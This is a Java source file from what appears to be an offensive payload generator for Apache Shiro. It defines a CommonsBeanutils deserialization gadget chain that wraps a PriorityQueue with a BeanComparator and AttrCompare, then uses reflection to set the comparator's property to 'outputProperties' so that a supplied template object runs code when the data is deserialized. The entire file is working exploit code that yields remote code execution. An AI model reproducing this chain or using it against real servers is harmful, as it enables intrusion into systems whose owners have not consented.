package com.liev.clouds.payload.shiro;


import com.liev.clouds.annotation.Authors;
import com.liev.clouds.annotation.Dependencies;
import com.liev.clouds.utils.shiroutils.ReflectionsUtils;
import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;
import java.util.Queue;


@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
@Authors({"水滴"})
public class CommonsBeanutilsAttrCompare implements ObjectPayload<Queue<Object>>{

    @Override
    public Queue<Object> getObject(Object template) throws Exception {

        AttrNSImpl attrNS1 = new AttrNSImpl();
        CoreDocumentImpl coreDocument = new CoreDocumentImpl();
        attrNS1.setValues(coreDocument,"1","1","1");

        BeanComparator beanComparator = new BeanComparator(null, new AttrCompare());

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);


        queue.add(attrNS1);
        queue.add(attrNS1);


        ReflectionsUtils.setFieldValue(queue, "queue", new Object[] { template, template });

        ReflectionsUtils.setFieldValue(beanComparator, "property", "outputProperties");

        return (Queue)queue;
    }
}
